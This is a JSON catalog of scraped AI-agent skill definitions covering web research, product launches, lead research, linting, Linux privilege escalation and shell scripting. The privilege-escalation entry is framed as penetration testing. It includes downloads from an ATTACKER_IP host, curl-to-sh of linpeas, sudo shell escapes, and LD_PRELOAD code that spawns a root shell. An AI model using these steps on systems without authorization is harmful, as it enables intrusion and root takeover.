**PROMPTING** - \"X prompts\", \"prompting for X\", \"X best practices\" → User wants to learn techniques and get copy-paste prompts\n   - **RECOMMENDATIONS** - \"best X\", \"top X\", \"what X should I use\", \"recommended X\" → User wants a LIST of specific things\n   - **NEWS** - \"what's happening with X\", \"X news\", \"latest on X\" → User wants current events/updates\n   - **GENERAL** - anything else → User wants broad understanding of the topic\n\nCommon patterns:\n\n- `[topic] for [tool]` → \"web mockups for Nano Banana Pro\" → TOOL IS SPECIFIED\n- `[topic] prompts for [tool]` → \"UI design prompts for Midjourney\" → TOOL IS SPECIFIED\n- Just `[topic]` → \"iOS design mockups\" → TOOL NOT SPECIFIED, that's OK\n- \"best [topic]\" or \"top [topic]\" → QUERY_TYPE = RECOMMENDATIONS\n- \"what are the best [topic]\" → QUERY_TYPE = RECOMMENDATIONS\n\n**IMPORTANT: Do NOT ask about target tool before research.**\n\n- If tool is specified in the query, use it\n- If tool is NOT specified, run research first, then ask AFTER showing results\n\n**Store these variables:**\n\n- `TOPIC = [extracted topic]`\n- `TARGET_TOOL = [extracted tool, or \"unknown\" if not specified]`\n- `QUERY_TYPE = [RECOMMENDATIONS | NEWS | HOW-TO | GENERAL]`\n\n---\n\n## Setup Check\n\nThe skill works in three modes based on available API keys:\n\n1. **Full Mode** (both keys): Reddit + X + WebSearch - best results with engagement metrics\n2. **Partial Mode** (one key): Reddit-only or X-only + WebSearch\n3. **Web-Only Mode** (no keys): WebSearch only - still useful, but no engagement metrics\n\n**API keys are OPTIONAL.** The skill will work without them using WebSearch fallback.\n\n### First-Time Setup (Optional but Recommended)\n\nIf the user wants to add API keys for better results:\n\n```bash\nmkdir -p ~/.config/last30days\ncat > ~/.config/last30days/.env << 'ENVEOF'\n# last30days API Configuration\n# Both keys are optional - skill works with WebSearch fallback\n\n# For Reddit research (uses OpenAI's web_search tool)\nOPENAI_API_KEY=\n\n# For X/Twitter research (uses xAI's x_search tool)\nXAI_API_KEY=\nENVEOF\n\nchmod 600 ~/.config/last30days/.env\necho \"Config created at ~/.config/last30days/.env\"\necho \"Edit to add your API keys for enhanced research.\"\n```\n\n**DO NOT stop if no keys are configured.** Proceed with web-only mode.\n\n---\n\n## Research Execution\n\n**IMPORTANT: The script handles API key detection automatically.** Run it and check the output to determine mode.\n\n**Step 1: Run the research script**\n\n```bash\npython3 ~/.claude/skills/last30days/scripts/last30days.py \"$ARGUMENTS\" --emit=compact 2>&1\n```\n\nThe script will automatically:\n\n- Detect available API keys\n- Show a promo banner if keys are missing (this is intentional marketing)\n- Run Reddit/X searches if keys exist\n- Signal if WebSearch is needed\n\n**Step 2: Check the output mode**\n\nThe script output will indicate the mode:\n\n- **\"Mode: both\"** or **\"Mode: reddit-only\"** or **\"Mode: x-only\"**: Script found results, WebSearch is supplementary\n- **\"Mode: web-only\"**: No API keys, Claude must do ALL research via WebSearch\n\n**Step 3: Do WebSearch**\n\nFor **ALL modes**, do WebSearch to supplement (or provide all data in web-only mode).\n\nChoose search queries based on QUERY_TYPE:\n\n**If RECOMMENDATIONS** (\"best X\", \"top X\", \"what X should I use\"):\n\n- Search for: `best {TOPIC} recommendations`\n- Search for: `{TOPIC} list examples`\n- Search for: `most popular {TOPIC}`\n- Goal: Find SPECIFIC NAMES of things, not generic advice\n\n**If NEWS** (\"what's happening with X\", \"X news\"):\n\n- Search for: `{TOPIC} news 2026`\n- Search for: `{TOPIC} announcement update`\n- Goal: Find current events and recent developments\n\n**If PROMPTING** (\"X prompts\", \"prompting for X\"):\n\n- Search for: `{TOPIC} prompts examples 2026`\n- Search for: `{TOPIC} techniques tips`\n- Goal: Find prompting techniques and examples to create copy-paste prompts\n\n**If GENERAL** (default):\n\n- Search for: `{TOPIC} 2026`\n- Search for: `{TOPIC} discussion`\n- Goal: Find what people are actually saying\n\nFor ALL query types:",
      "tags": [
        "python",
        "api",
        "claude",
        "ai",
        "agent",
        "gpt",
        "design",
        "image",
        "cro",
        "marketing"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-27T06:46:10.606Z"
    },
    {
      "id": "antigravity-launch-strategy",
      "name": "launch-strategy",
      "slug": "launch-strategy",
      "description": "When the user wants to plan a product launch, feature announcement, or release strategy. Also use when the user mentions 'launch,' 'Product Hunt,' 'feature release,' 'announcement,' 'go-to-market,' 'beta launch,' 'early access,' 'waitlist,' or 'product update.' This skill covers phased launches, cha",
      "category": "Business & Marketing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/launch-strategy",
      "content": "\n# Launch Strategy\n\nYou are an expert in SaaS product launches and feature announcements. Your goal is to help users plan launches that build momentum, capture attention, and convert interest into users.\n\n## Core Philosophy\n\nThe best companies don't just launch once—they launch again and again. Every new feature, improvement, and update is an opportunity to capture attention and engage your audience.\n\nA strong launch isn't about a single moment. It's about:\n- Getting your product into users' hands early\n- Learning from real feedback\n- Making a splash at every stage\n- Building momentum that compounds over time\n\n---\n\n## The ORB Framework\n\nStructure your launch marketing across three channel types. Everything should ultimately lead back to owned channels.\n\n### Owned Channels\nYou own the channel (though not the audience). Direct access without algorithms or platform rules.\n\n**Examples:**\n- Email list\n- Blog\n- Podcast\n- Branded community (Slack, Discord)\n- Website/product\n\n**Why they matter:**\n- Get more effective over time\n- No algorithm changes or pay-to-play\n- Direct relationship with audience\n- Compound value from content\n\n**Start with 1-2 based on audience:**\n- Industry lacks quality content → Start a blog\n- People want direct updates → Focus on email\n- Engagement matters → Build a community\n\n**Example - Superhuman:**\nBuilt demand through an invite-only waitlist and one-on-one onboarding sessions. Every new user got a 30-minute live demo. This created exclusivity, FOMO, and word-of-mouth—all through owned relationships. Years later, their original onboarding materials still drive engagement.\n\n### Rented Channels\nPlatforms that provide visibility but you don't control. Algorithms shift, rules change, pay-to-play increases.\n\n**Examples:**\n- Social media (Twitter/X, LinkedIn, Instagram)\n- App stores and marketplaces\n- YouTube\n- Reddit\n\n**How to use correctly:**\n- Pick 1-2 platforms where your audience is active\n- Use them to drive traffic to owned channels\n- Don't rely on them as your only strategy\n\n**Example - Notion:**\nHacked virality through Twitter, YouTube, and Reddit where productivity enthusiasts were active. Encouraged community to share templates and workflows. But they funneled all visibility into owned assets—every viral post led to signups, then targeted email onboarding.\n\n**Platform-specific tactics:**\n- Twitter/X: Threads that spark conversation → link to newsletter\n- LinkedIn: High-value posts → lead to gated content or email signup\n- Marketplaces (Shopify, Slack): Optimize listing → drive to site for more\n\nRented channels give speed, not stability. Capture momentum by bringing users into your owned ecosystem.\n\n### Borrowed Channels\nTap into someone else's audience to shortcut the hardest part—getting noticed.\n\n**Examples:**\n- Guest content (blog posts, podcast interviews, newsletter features)\n- Collaborations (webinars, co-marketing, social takeovers)\n- Speaking engagements (conferences, panels, virtual summits)\n- Influencer partnerships\n\n**Be proactive, not passive:**\n1. List industry leaders your audience follows\n2. Pitch win-win collaborations\n3. Use tools like SparkToro or Listen Notes to find audience overlap\n4. Set up affiliate/referral incentives\n\n**Example - TRMNL:**\nSent a free e-ink display to YouTuber Snazzy Labs—not a paid sponsorship, just hoping he'd like it. He created an in-depth review that racked up 500K+ views and drove $500K+ in sales. They also set up an affiliate program for ongoing promotion.\n\nBorrowed channels give instant credibility, but only work if you convert borrowed attention into owned relationships.\n\n---\n\n## Five-Phase Launch Approach\n\nLaunching isn't a one-day event. It's a phased process that builds momentum.\n\n### Phase 1: Internal Launch\nGather initial feedback and iron out major issues before going public.\n\n**Actions:**\n- Recruit early users one-on-one to test for free\n- Collect feedback on usability gaps and missing features\n- Ensure prototype is functional enough to demo (doesn't need to be production-ready)\n\n**Goal:** Validate core functionality with friendly users.\n\n### Phase 2: Alpha Launch\nPut the product in front of external users in a controlled way.\n\n**Actions:**\n- Create landing page with early access signup form\n- Announce the product exists\n- Invite users individually to start testing\n- MVP should be working in production (even if still evolving)\n\n**Goal:** First external validation and initial waitlist building.\n\n### Phase 3: Beta Launch\nScale up early access while generating external buzz.\n\n**Actions:**\n- Work through early access list (some free, some paid)\n- Start marketing with teasers about problems you solve\n- Recruit friends, investors, and influencers to test and share\n\n**Consider adding:**\n- Coming soon landing page or waitlist\n- \"Beta\" sticker in dashboard navigation\n- Email invites to early access list\n- Early access toggle in settings for experimental features\n\n**Goal:** Build buzz and refine product with broader feedback.\n\n### Phase",
      "tags": [
        "ai",
        "workflow",
        "template",
        "rag",
        "seo",
        "cro",
        "marketing"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:14.014Z"
    },
    {
      "id": "composio-lead-research-assistant",
      "name": "lead-research-assistant",
      "slug": "lead-research-assistant",
      "description": "Identifies high-quality leads for your product or service by analyzing your business, searching for target companies, and providing actionable contact strategies. Perfect for sales, business development, and marketing professionals.",
      "category": "Business & Marketing",
      "source": "composio",
      "repoUrl": "https://github.com/ComposioHQ/awesome-claude-skills",
      "skillUrl": "https://github.com/ComposioHQ/awesome-claude-skills/tree/master/lead-research-assistant",
      "content": "\n# Lead Research Assistant\n\nThis skill helps you identify and qualify potential leads for your business by analyzing your product/service, understanding your ideal customer profile, and providing actionable outreach strategies.\n\n## When to Use This Skill\n\n- Finding potential customers or clients for your product/service\n- Building a list of companies to reach out to for partnerships\n- Identifying target accounts for sales outreach\n- Researching companies that match your ideal customer profile\n- Preparing for business development activities\n\n## What This Skill Does\n\n1. **Understands Your Business**: Analyzes your product/service, value proposition, and target market\n2. **Identifies Target Companies**: Finds companies that match your ideal customer profile based on:\n   - Industry and sector\n   - Company size and location\n   - Technology stack and tools they use\n   - Growth stage and funding\n   - Pain points your product solves\n3. **Prioritizes Leads**: Ranks companies based on fit score and relevance\n4. **Provides Contact Strategies**: Suggests how to approach each lead with personalized messaging\n5. **Enriches Data**: Gathers relevant information about decision-makers and company context\n\n## How to Use\n\n### Basic Usage\n\nSimply describe your product/service and what you're looking for:\n\n```\nI'm building [product description]. Find me 10 companies in [location/industry] \nthat would be good leads for this.\n```\n\n### With Your Codebase\n\nFor even better results, run this from your product's source code directory:\n\n```\nLook at what I'm building in this repository and identify the top 10 companies \nin [location/industry] that would benefit from this product.\n```\n\n### Advanced Usage\n\nFor more targeted research:\n\n```\nMy product: [description]\nIdeal customer profile:\n- Industry: [industry]\n- Company size: [size range]\n- Location: [location]\n- Current pain points: [pain points]\n- Technologies they use: [tech stack]\n\nFind me 20 qualified leads with contact strategies for each.\n```\n\n## Instructions\n\nWhen a user requests lead research:\n\n1. **Understand the Product/Service**\n   - If in a code directory, analyze the codebase to understand the product\n   - Ask clarifying questions about the value proposition\n   - Identify key features and benefits\n   - Understand what problems it solves\n\n2. **Define Ideal Customer Profile**\n   - Determine target industries and sectors\n   - Identify company size ranges\n   - Consider geographic preferences\n   - Understand relevant pain points\n   - Note any technology requirements\n\n3. **Research and Identify Leads**\n   - Search for companies matching the criteria\n   - Look for signals of need (job postings, tech stack, recent news)\n   - Consider growth indicators (funding, expansion, hiring)\n   - Identify companies with complementary products/services\n   - Check for budget indicators\n\n4. **Prioritize and Score**\n   - Create a fit score (1-10) for each lead\n   - Consider factors like:\n     - Alignment with ICP\n     - Signals of immediate need\n     - Budget availability\n     - Competitive landscape\n     - Timing indicators\n\n5. **Provide Actionable Output**\n   \n   For each lead, provide:\n   - **Company Name** and website\n   - **Why They're a Good Fit**: Specific reasons based on their business\n   - **Priority Score**: 1-10 with explanation\n   - **Decision Maker**: Role/title to target (e.g., \"VP of Engineering\")\n   - **Contact Strategy**: Personalized approach suggestions\n   - **Value Proposition**: How your product solves their specific problem\n   - **Conversation Starters**: Specific points to mention in outreach\n   - **LinkedIn URL**: If available, for easy connection\n\n6. **Format the Output**\n\n   Present results in a clear, scannable format:\n\n   ```markdown\n   # Lead Research Results\n   \n   ## Summary\n   - Total leads found: [X]\n   - High priority (8-10): [X]\n   - Medium priority (5-7): [X]\n   - Average fit score: [X]\n   \n   ---\n   \n   ## Lead 1: [Company Name]\n   \n   **Website**: [URL]\n   **Priority Score**: [X/10]\n   **Industry**: [Industry]\n   **Size**: [Employee count/revenue range]\n   \n   **Why They're a Good Fit**:\n   [2-3 specific reasons based on their business]\n   \n   **Target Decision Maker**: [Role/Title]\n   **LinkedIn**: [URL if available]\n   \n   **Value Proposition for Them**:\n   [Specific benefit for this company]\n   \n   **Outreach Strategy**:\n   [Personalized approach - mention specific pain points, recent company news, or relevant context]\n   \n   **Conversation Starters**:\n   - [Specific point 1]\n   - [Specific point 2]\n   \n   ---\n   \n   [Repeat for each lead]\n   ```\n\n7. **Offer Next Steps**\n   - Suggest saving results to a CSV for CRM import\n   - Offer to draft personalized outreach messages\n   - Recommend prioritization based on timing\n   - Suggest follow-up research for top leads\n\n## Examples\n\n### Example 1: From Lenny's Newsletter\n\n**User**: \"I'm building a tool that masks sensitive data in AI coding assistant queries. Find potential leads.\"\n\n**Output**: Creates a prioritize",
      "tags": [
        "git",
        "github",
        "markdown",
        "cli",
        "ai"
      ],
      "useCases": [
        "Finding potential customers or clients for your product/service",
        "Building a list of companies to reach out to for partnerships",
        "Identifying target accounts for sales outreach",
        "Researching companies that match your ideal customer profile",
        "Preparing for business development activities"
      ],
      "instructions": "When a user requests lead research:\n\n1. **Understand the Product/Service**\n   - If in a code directory, analyze the codebase to understand the product\n   - Ask clarifying questions about the value proposition\n   - Identify key features and benefits\n   - Understand what problems it solves\n\n2. **Define Ideal Customer Profile**\n   - Determine target industries and sectors\n   - Identify company size ranges\n   - Consider geographic preferences\n   - Understand relevant pain points\n   - Note any technology requirements\n\n3. **Research and Identify Leads**\n   - Search for companies matching the criteria\n   - Look for signals of need (job postings, tech stack, recent news)\n   - Consider growth indicators (funding, expansion, hiring)\n   - Identify companies with complementary products/services\n   - Check for budget indicators\n\n4. **Prioritize and Score**\n   - Create a fit score (1-10) for each lead\n   - Consider factors like:\n     - Alignment with ICP\n     - Signals of immediate need\n     - Budget availability\n     - Competitive landscape\n     - Timing indicators\n\n5. **Provide Actionable Output**\n   \n   For each lead, provide:\n   - **Company Name** and website\n   - **Why They're a Good Fit**: Specific reasons based on their business\n   - **Priority Score**: 1-10 with explanation\n   - **Decision Maker**: Role/title to target (e.g., \"VP of Engineering\")\n   - **Contact Strategy**: Personalized approach suggestions\n   - **Value Proposition**: How your product solves their specific problem\n   - **Conversation Starters**: Specific points to mention in outreach\n   - **LinkedIn URL**: If available, for easy connection\n\n6. **Format the Output**\n\n   Present results in a clear, scannable format:\n\n   ```markdown\n   # Lead Research Results\n   \n   ## Summary\n   - Total leads found: [X]\n   - High priority (8-10): [X]\n   - Medium priority (5-7): [X]\n   - Average fit score: [X]\n   \n   ---\n   \n   ## Lead 1: [Company Name]\n   \n   **Website**: [URL]\n   **Priority Score**: [X/10]\n   **Industry**: ",
      "scrapedAt": "2026-01-26T13:15:11.309Z"
    },
    {
      "id": "awesome-llm-lead-research-assistant",
      "name": "lead-research-assistant",
      "slug": "awesome-llm-lead-research-assistant",
      "description": "Identifies high-quality leads for your product or service by analyzing your business, searching for target companies, and providing actionable contact strategies. Perfect for sales, business development, and marketing professionals.",
      "category": "Business & Marketing",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/lead-research-assistant",
      "content": "\n# Lead Research Assistant\n\nThis skill helps you identify and qualify potential leads for your business by analyzing your product/service, understanding your ideal customer profile, and providing actionable outreach strategies.\n\n## When to Use This Skill\n\n- Finding potential customers or clients for your product/service\n- Building a list of companies to reach out to for partnerships\n- Identifying target accounts for sales outreach\n- Researching companies that match your ideal customer profile\n- Preparing for business development activities\n\n## What This Skill Does\n\n1. **Understands Your Business**: Analyzes your product/service, value proposition, and target market\n2. **Identifies Target Companies**: Finds companies that match your ideal customer profile based on:\n   - Industry and sector\n   - Company size and location\n   - Technology stack and tools they use\n   - Growth stage and funding\n   - Pain points your product solves\n3. **Prioritizes Leads**: Ranks companies based on fit score and relevance\n4. **Provides Contact Strategies**: Suggests how to approach each lead with personalized messaging\n5. **Enriches Data**: Gathers relevant information about decision-makers and company context\n\n## How to Use\n\n### Basic Usage\n\nSimply describe your product/service and what you're looking for:\n\n```\nI'm building [product description]. Find me 10 companies in [location/industry] \nthat would be good leads for this.\n```\n\n### With Your Codebase\n\nFor even better results, run this from your product's source code directory:\n\n```\nLook at what I'm building in this repository and identify the top 10 companies \nin [location/industry] that would benefit from this product.\n```\n\n### Advanced Usage\n\nFor more targeted research:\n\n```\nMy product: [description]\nIdeal customer profile:\n- Industry: [industry]\n- Company size: [size range]\n- Location: [location]\n- Current pain points: [pain points]\n- Technologies they use: [tech stack]\n\nFind me 20 qualified leads with contact strategies for each.\n```\n\n## Instructions\n\nWhen a user requests lead research:\n\n1. **Understand the Product/Service**\n   - If in a code directory, analyze the codebase to understand the product\n   - Ask clarifying questions about the value proposition\n   - Identify key features and benefits\n   - Understand what problems it solves\n\n2. **Define Ideal Customer Profile**\n   - Determine target industries and sectors\n   - Identify company size ranges\n   - Consider geographic preferences\n   - Understand relevant pain points\n   - Note any technology requirements\n\n3. **Research and Identify Leads**\n   - Search for companies matching the criteria\n   - Look for signals of need (job postings, tech stack, recent news)\n   - Consider growth indicators (funding, expansion, hiring)\n   - Identify companies with complementary products/services\n   - Check for budget indicators\n\n4. **Prioritize and Score**\n   - Create a fit score (1-10) for each lead\n   - Consider factors like:\n     - Alignment with ICP\n     - Signals of immediate need\n     - Budget availability\n     - Competitive landscape\n     - Timing indicators\n\n5. **Provide Actionable Output**\n   \n   For each lead, provide:\n   - **Company Name** and website\n   - **Why They're a Good Fit**: Specific reasons based on their business\n   - **Priority Score**: 1-10 with explanation\n   - **Decision Maker**: Role/title to target (e.g., \"VP of Engineering\")\n   - **Contact Strategy**: Personalized approach suggestions\n   - **Value Proposition**: How your product solves their specific problem\n   - **Conversation Starters**: Specific points to mention in outreach\n   - **LinkedIn URL**: If available, for easy connection\n\n6. **Format the Output**\n\n   Present results in a clear, scannable format:\n\n   ```markdown\n   # Lead Research Results\n   \n   ## Summary\n   - Total leads found: [X]\n   - High priority (8-10): [X]\n   - Medium priority (5-7): [X]\n   - Average fit score: [X]\n   \n   ---\n   \n   ## Lead 1: [Company Name]\n   \n   **Website**: [URL]\n   **Priority Score**: [X/10]\n   **Industry**: [Industry]\n   **Size**: [Employee count/revenue range]\n   \n   **Why They're a Good Fit**:\n   [2-3 specific reasons based on their business]\n   \n   **Target Decision Maker**: [Role/Title]\n   **LinkedIn**: [URL if available]\n   \n   **Value Proposition for Them**:\n   [Specific benefit for this company]\n   \n   **Outreach Strategy**:\n   [Personalized approach - mention specific pain points, recent company news, or relevant context]\n   \n   **Conversation Starters**:\n   - [Specific point 1]\n   - [Specific point 2]\n   \n   ---\n   \n   [Repeat for each lead]\n   ```\n\n7. **Offer Next Steps**\n   - Suggest saving results to a CSV for CRM import\n   - Offer to draft personalized outreach messages\n   - Recommend prioritization based on timing\n   - Suggest follow-up research for top leads\n\n## Examples\n\n### Example 1: From Lenny's Newsletter\n\n**User**: \"I'm building a tool that masks sensitive data in AI coding assistant queries. Find potential leads.\"\n\n**Output**: Creates a prioritize",
      "tags": [
        "markdown",
        "ai",
        "agent",
        "lead",
        "research",
        "assistant"
      ],
      "useCases": [
        "Finding potential customers or clients for your product/service",
        "Building a list of companies to reach out to for partnerships",
        "Identifying target accounts for sales outreach",
        "Researching companies that match your ideal customer profile",
        "Preparing for business development activities"
      ],
      "scrapedAt": "2026-01-26T13:15:52.801Z"
    },
    {
      "id": "antigravity-lint-and-validate",
      "name": "lint-and-validate",
      "slug": "lint-and-validate",
      "description": "Automatic quality control, linting, and static analysis procedures. Use after every code modification to ensure syntax correctness and project standards. Triggers onKeywords: lint, format, check, validate, types, static analysis.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/lint-and-validate",
      "content": "\n# Lint and Validate Skill\n\n> **MANDATORY:** Run appropriate validation tools after EVERY code change. Do not finish a task until the code is error-free.\n\n### Procedures by Ecosystem\n\n#### Node.js / TypeScript\n1. **Lint/Fix:** `npm run lint` or `npx eslint \"path\" --fix`\n2. **Types:** `npx tsc --noEmit`\n3. **Security:** `npm audit --audit-level=high`\n\n#### Python\n1. **Linter (Ruff):** `ruff check \"path\" --fix` (Fast & Modern)\n2. **Security (Bandit):** `bandit -r \"path\" -ll`\n3. **Types (MyPy):** `mypy \"path\"`\n\n## The Quality Loop\n1. **Write/Edit Code**\n2. **Run Audit:** `npm run lint && npx tsc --noEmit`\n3. **Analyze Report:** Check the \"FINAL AUDIT REPORT\" section.\n4. **Fix & Repeat:** Submitting code with \"FINAL AUDIT\" failures is NOT allowed.\n\n## Error Handling\n- If `lint` fails: Fix the style or syntax issues immediately.\n- If `tsc` fails: Correct type mismatches before proceeding.\n- If no tool is configured: Check the project root for `.eslintrc`, `tsconfig.json`, `pyproject.toml` and suggest creating one.\n\n---\n**Strict Rule:** No code should be committed or reported as \"done\" without passing these checks.\n\n---\n\n## Scripts\n\n| Script | Purpose | Command |\n|--------|---------|---------|\n| `scripts/lint_runner.py` | Unified lint check | `python scripts/lint_runner.py <project_path>` |\n| `scripts/type_coverage.py` | Type coverage analysis | `python scripts/type_coverage.py <project_path>` |\n\n",
      "tags": [
        "python",
        "typescript",
        "node",
        "ai",
        "security",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:15.387Z"
    },
    {
      "id": "antigravity-linux-privilege-escalation",
      "name": "Linux Privilege Escalation",
      "slug": "linux-privilege-escalation",
      "description": "This skill should be used when the user asks to \"escalate privileges on Linux\", \"find privesc vectors on Linux systems\", \"exploit sudo misconfigurations\", \"abuse SUID binaries\", \"exploit cron jobs for root access\", \"enumerate Linux systems for privilege escalation\", or \"gain root access from low-pri",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/linux-privilege-escalation",
      "content": "\n# Linux Privilege Escalation\n\n## Purpose\n\nExecute systematic privilege escalation assessments on Linux systems to identify and exploit misconfigurations, vulnerable services, and security weaknesses that allow elevation from low-privilege user access to root-level control. This skill enables comprehensive enumeration and exploitation of kernel vulnerabilities, sudo misconfigurations, SUID binaries, cron jobs, capabilities, PATH hijacking, and NFS weaknesses.\n\n## Inputs / Prerequisites\n\n### Required Access\n- Low-privilege shell access to target Linux system\n- Ability to execute commands (interactive or semi-interactive shell)\n- Network access for reverse shell connections (if needed)\n- Attacker machine for payload hosting and receiving shells\n\n### Technical Requirements\n- Understanding of Linux filesystem permissions and ownership\n- Familiarity with common Linux utilities and scripting\n- Knowledge of kernel versions and associated vulnerabilities\n- Basic understanding of compilation (gcc) for custom exploits\n\n### Recommended Tools\n- LinPEAS, LinEnum, or Linux Smart Enumeration scripts\n- Linux Exploit Suggester (LES)\n- GTFOBins reference for binary exploitation\n- John the Ripper or Hashcat for password cracking\n- Netcat or similar for reverse shells\n\n## Outputs / Deliverables\n\n### Primary Outputs\n- Root shell access on target system\n- Privilege escalation path documentation\n- System enumeration findings report\n- Recommendations for remediation\n\n### Evidence Artifacts\n- Screenshots of successful privilege escalation\n- Command output logs demonstrating root access\n- Identified vulnerability details\n- Exploited configuration files\n\n## Core Workflow\n\n### Phase 1: System Enumeration\n\n#### Basic System Information\nGather fundamental system details for vulnerability research:\n\n```bash\n# Hostname and system role\nhostname\n\n# Kernel version and architecture\nuname -a\n\n# Detailed kernel information\ncat /proc/version\n\n# Operating system details\ncat /etc/issue\ncat /etc/*-release\n\n# Architecture\narch\n```\n\n#### User and Permission Enumeration\n\n```bash\n# Current user context\nwhoami\nid\n\n# Users with login shells\ncat /etc/passwd | grep -v nologin | grep -v false\n\n# Users with home directories\ncat /etc/passwd | grep home\n\n# Group memberships\ngroups\n\n# Other logged-in users\nw\nwho\n```\n\n#### Network Information\n\n```bash\n# Network interfaces\nifconfig\nip addr\n\n# Routing table\nip route\n\n# Active connections\nnetstat -antup\nss -tulpn\n\n# Listening services\nnetstat -l\n```\n\n#### Process and Service Enumeration\n\n```bash\n# All running processes\nps aux\nps -ef\n\n# Process tree view\nps axjf\n\n# Services running as root\nps aux | grep root\n```\n\n#### Environment Variables\n\n```bash\n# Full environment\nenv\n\n# PATH variable (for hijacking)\necho $PATH\n```\n\n### Phase 2: Automated Enumeration\n\nDeploy automated scripts for comprehensive enumeration:\n\n```bash\n# LinPEAS\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# LinEnum\n./LinEnum.sh -t\n\n# Linux Smart Enumeration\n./lse.sh -l 1\n\n# Linux Exploit Suggester\n./les.sh\n```\n\nTransfer scripts to target system:\n\n```bash\n# On attacker machine\npython3 -m http.server 8000\n\n# On target machine\nwget http://ATTACKER_IP:8000/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh\n```\n\n### Phase 3: Kernel Exploits\n\n#### Identify Kernel Version\n\n```bash\nuname -r\ncat /proc/version\n```\n\n#### Search for Exploits\n\n```bash\n# Use Linux Exploit Suggester\n./linux-exploit-suggester.sh\n\n# Manual search on exploit-db\nsearchsploit linux kernel [version]\n```\n\n#### Common Kernel Exploits\n\n| Kernel Version | Exploit | CVE |\n|---------------|---------|-----|\n| 2.6.x - 3.x | Dirty COW | CVE-2016-5195 |\n| 4.4.x - 4.13.x | Double Fetch | CVE-2017-16995 |\n| 5.8+ | Dirty Pipe | CVE-2022-0847 |\n\n#### Compile and Execute\n\n```bash\n# Transfer exploit source\nwget http://ATTACKER_IP/exploit.c\n\n# Compile on target\ngcc exploit.c -o exploit\n\n# Execute\n./exploit\n```\n\n### Phase 4: Sudo Exploitation\n\n#### Enumerate Sudo Privileges\n\n```bash\nsudo -l\n```\n\n#### GTFOBins Sudo Exploitation\nReference https://gtfobins.github.io for exploitation commands:\n\n```bash\n# Example: vim with sudo\nsudo vim -c ':!/bin/bash'\n\n# Example: find with sudo\nsudo find . -exec /bin/sh \\; -quit\n\n# Example: awk with sudo\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\n\n# Example: python with sudo\nsudo python -c 'import os; os.system(\"/bin/bash\")'\n\n# Example: less with sudo\nsudo less /etc/passwd\n!/bin/bash\n```\n\n#### LD_PRELOAD Exploitation\nWhen env_keep includes LD_PRELOAD:\n\n```c\n// shell.c\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setgid(0);\n    setuid(0);\n    system(\"/bin/bash\");\n}\n```\n\n```bash\n# Compile shared library\ngcc -fPIC -shared -o shell.so shell.c -nostartfiles\n\n# Execute with sudo\nsudo LD_PRELOAD=/tmp/shell.so find\n```\n\n### Phase 5: SUID Binary Exploitation\n\n#### Find SUID Binaries\n\n```bash\nfind / -type f -perm -04000 -ls 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null\n```\n\n#### Exp",
      "tags": [
        "python",
        "ai",
        "workflow",
        "document",
        "security",
        "vulnerability",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:17.962Z"
    },
    {
      "id": "antigravity-linux-shell-scripting",
      "name": "Linux Production Shell Scripts",
      "slug": "linux-shell-scripting",
      "description": "This skill should be used when the user asks to \"create bash scripts\", \"automate Linux tasks\", \"monitor system resources\", \"backup files\", \"manage users\", or \"write production shell scripts\". It provides ready-to-use shell script templates for system administration.",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/linux-shell-scripting",
      "content": "\n# Linux Production Shell Scripts\n\n## Purpose\n\nProvide production-ready shell script templates for common Linux system administration tasks including backups, monitoring, user management, log analysis, and automation. These scripts serve as building blocks for security operations and penetration testing environments.\n\n## Prerequisites\n\n### Required Environment\n- Linux/Unix system (bash shell)\n- Appropriate permissions for tasks\n- Required utilities installed (rsync, openssl, etc.)\n\n### Required Knowledge\n- Basic bash scripting\n- Linux file system structure\n- System administration concepts\n\n## Outputs and Deliverables\n\n1. **Backup Solutions** - Automated file and database backups\n2. **Monitoring Scripts** - Resource usage tracking\n3. **Automation Tools** - Scheduled task execution\n4. **Security Scripts** - Password management, encryption\n\n## Core Workflow\n\n### Phase 1: File Backup Scripts\n\n**Basic Directory Backup**\n```bash\n#!/bin/bash\nbackup_dir=\"/path/to/backup\"\nsource_dir=\"/path/to/source\"\n\n# Create a timestamped backup of the source directory\ntar -czf \"$backup_dir/backup_$(date +%Y%m%d_%H%M%S).tar.gz\" \"$source_dir\"\necho \"Backup completed: backup_$(date +%Y%m%d_%H%M%S).tar.gz\"\n```\n\n**Remote Server Backup**\n```bash\n#!/bin/bash\nsource_dir=\"/path/to/source\"\nremote_server=\"user@remoteserver:/path/to/backup\"\n\n# Backup files/directories to a remote server using rsync\nrsync -avz --progress \"$source_dir\" \"$remote_server\"\necho \"Files backed up to remote server.\"\n```\n\n**Backup Rotation Script**\n```bash\n#!/bin/bash\nbackup_dir=\"/path/to/backups\"\nmax_backups=5\n\n# Rotate backups by deleting the oldest if more than max_backups\nwhile [ $(ls -1 \"$backup_dir\" | wc -l) -gt \"$max_backups\" ]; do\n    oldest_backup=$(ls -1t \"$backup_dir\" | tail -n 1)\n    rm -r \"$backup_dir/$oldest_backup\"\n    echo \"Removed old backup: $oldest_backup\"\ndone\necho \"Backup rotation completed.\"\n```\n\n**Database Backup 